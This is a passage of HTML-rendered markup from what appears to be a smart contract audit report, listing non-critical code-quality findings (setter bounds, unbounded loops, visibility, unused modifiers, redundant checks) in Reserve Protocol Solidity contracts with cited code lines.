class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">6</span><span class=\"mtk1\">: {</span><span class=\"mtk12\">IStRSRVotes</span><span class=\"mtk1\">} </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../interfaces/IStRSRVotes.sol&quot;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Instances - All of the contracts.</p>\n<h2 id=\"n-02-max-value-cant-be-applied-in-the-setters\" style=\"position:relative;\"><a href=\"#n-02-max-value-cant-be-applied-in-the-setters\" aria-label=\"n 02 max value cant be applied in the setters permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-02] Max value can’t be applied in the setters</h2>\n<p>The function <code>setTradingDelay</code> is used by the governance to change the tradingDelay.</p>\n<p>However in the require statement applying the maximum delay is not allowed.</p>\n<p>Consider changing the require statement to: <code>require(val &#x3C; MAX_TRADING_DELAY, \"invalid tradingDelay\")</code></p>\n<p>Other instances:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BackingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">263</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setBackingBuffer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk11\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk11\">Broker</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">133: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setAuctionLength</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk11\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk11\">Furnace</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">88: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPeriod</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">96: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setRatio</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk11\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk11\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">589: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setIssuanceRate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">602: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setScalingRedemptionRate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk11\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk11\">StRSR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">812: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUnstakingDelay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">820: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setRewardPeriod</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">828: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setRewardRatio</span></span></span></code></pre>\n<h2 id=\"n-03-using-while-for-unbounded-loops-isnt-recommended\" style=\"position:relative;\"><a href=\"#n-03-using-while-for-unbounded-loops-isnt-recommended\" aria-label=\"n 03 using while for unbounded loops isnt recommended permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-03] Using while for unbounded loops isn’t recommended</h2>\n<p>Don’t write loops that are unbounded as this can hit the gas limit, causing your transaction to fail.</p>\n<p>For the reason above, while and do while loops are rarely used.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">523</span><span class=\"mtk1\">: </span><span class=\"mtk15\">while</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_targetNames</span><span class=\"mtk1\">.</span><span class=\"mtk11\">length</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StRSR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">449</span><span class=\"mtk1\">: </span><span class=\"mtk15\">while</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">left</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">right</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StRSRVotes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">103</span><span class=\"mtk1\">: </span><span class=\"mtk15\">while</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">low</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">high</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<h2 id=\"n-04-inconsistent-visibility-on-the-bool-disabled\" style=\"position:relative;\"><a href=\"#n-04-inconsistent-visibility-on-the-bool-disabled\" aria-label=\"n 04 inconsistent visibility on the bool disabled permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-04] Inconsistent visibility on the bool “disabled”</h2>\n<p>In some contracts the visibility of the bool <code>disabled</code> is set as private, while on others it is set as public.</p>\n<p>Instances:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">: </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">disabled</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Broker</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">: </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">disabled</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"n-05-modifier-exists-but-not-used-when-needed\" style=\"position:relative;\"><a href=\"#n-05-modifier-exists-but-not-used-when-needed\" aria-label=\"n 05 modifier exists but not used when needed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-05] Modifier exists, but not used when needed</h2>\n<p>In the RToken contract, a lot of private calls are made to <code>requireNotPausedOrFrozen()</code> checking if it’s paused or frozen.</p>\n<p>While there is already modifier used for this purpose in the contract.</p>\n<p>function without the modifier:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">520</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimRewards</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">521</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">requireNotPausedOrFrozen</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">522</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">RewardableLibP1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assetRegistry</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">523</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>function with the modifier used:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">378</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">vest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">endId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notPausedOrFrozen</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>As you can see there is already modifier with this purpose, but it isn’t used on all of the functions.</p>\n<p>Consider applying it on the other instances as well.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">520</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimRewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">527: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimRewardsSingle</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">534: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sweepRewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">541: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sweepRewardsSingle</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">556: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">579: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setBasketsNeeded</span></span></span></code></pre>\n<h2 id=\"n-06-unused-constructor\" style=\"position:relative;\"><a href=\"#n-06-unused-constructor\" aria-label=\"n 06 unused constructor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-06] Unused constructor</h2>\n<p>The constructor does nothing.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Main</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">23</span><span class=\"mtk1\">: </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">mixins</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Component</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">25</span><span class=\"mtk1\">: </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<h2 id=\"n-07-unnecessary-check-in-both-the-_mint-and-_burn-function\" style=\"position:relative;\"><a href=\"#n-07-unnecessary-check-in-both-the-_mint-and-_burn-function\" aria-label=\"n 07 unnecessary check in both the _mint and _burn function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-07] Unnecessary check in both the _mint and _burn function</h2>\n<p>The function <code>_mint</code> and burn in StRSR.sol is called only by someone calling the stake and unstake functions.<br>\nA check is made in the functions to ensure the account to mint and burn the amounts isn’t address(0).<br>\nHowever this isn’t possible as both the stake and unstake function input the address of the msg.sender.<br>\nAnd address(0) can’t call this functions, so this checks are unnecessary.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StRSR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">694</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">695</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;ERC20: mint to the zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">696</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint224</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">697</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">698</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">stakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">era</span><span class=\"mtk1\">][</span><span class=\"mtk12\">account</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">699</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">700</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">701</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">702</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_afterTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">703</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">708</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">709</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// untestable:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">710</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">//      _burn is only called from unstake(), which uses msg.sender as `account`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">711</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;ERC20: burn from the zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">712</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">713</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">eraStakes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">era</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">714</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">accountBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">eraStakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">715</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// untestable:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">716</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">//      _burn is only called from unstake(), which already checks this</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">717</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">accountBalance</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;ERC20: burn amount exceeds balance&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">718</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">719</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">eraStakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">accountBalance</span><span class=\"mtk1\"> - </span><span 